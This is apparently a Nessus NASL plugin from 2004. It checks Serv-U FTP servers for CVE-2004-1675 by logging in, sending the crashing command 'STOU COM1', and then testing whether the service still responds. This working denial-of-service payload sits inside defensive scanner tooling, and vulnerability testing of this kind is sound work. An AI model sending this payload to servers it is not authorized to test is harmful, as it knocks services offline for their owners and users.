#  This script was written by David Maciejak <david dot maciejak at kyxar dot fr>
#  based on work from
# (C) Tenable Network Security
#
#  Ref: Patrick <patrickthomassen gmail com>
#
# This script is released under the GNU GPL v2

if(description)
{
 script_id(14709);
 script_cve_id("CVE-2004-1675");
 script_bugtraq_id(11155);
 script_version ("$Revision: 1.6 $");
  
 name["english"] = "FTP Serv-U 4.x 5.x DoS";
  
 script_name(english:name["english"]);
	     
 desc["english"] = "
It is possible to crash the remote FTP server by sending it a STOU command. 

This vulnerability allows an attacker to prevent you from sharing data through FTP, 
and may even crash this host.

Solution : Upgrade to latest version of this software
Risk factor : High";
		 	     
 script_description(english:desc["english"]);  
 
 script_summary(english:"Crashes Serv-U");
 script_category(ACT_DENIAL);
 script_family(english:"Denial of Service");
  
 script_copyright(english:"This script is Copyright (C) 2004 David Maciejak");
		  
 script_dependencie("find_service.nes");
  script_require_ports("Services/ftp", 21);
 exit(0);
}

include("ftp_func.inc");

port = get_kb_item("Services/ftp");
if(!port)port = 21;

login = get_kb_item("ftp/login");
password = get_kb_item("ftp/password");


if(get_port_state(port))
{
 soc = open_sock_tcp(port);
 if(soc)
 {
  if(ftp_authenticate(socket:soc, user:login, pass:password))
  {
   s = string("STOU COM1", "\r\n");
   send(socket:soc, data:s);
   close(soc);
   
   soc2 = open_sock_tcp(port);
   if ( ! soc2 || ! recv_line(socket:soc2, length:4096 ) ) security_hole(port);
   else close(soc2);
   close(soc);
  }
 }
}
exit(0);
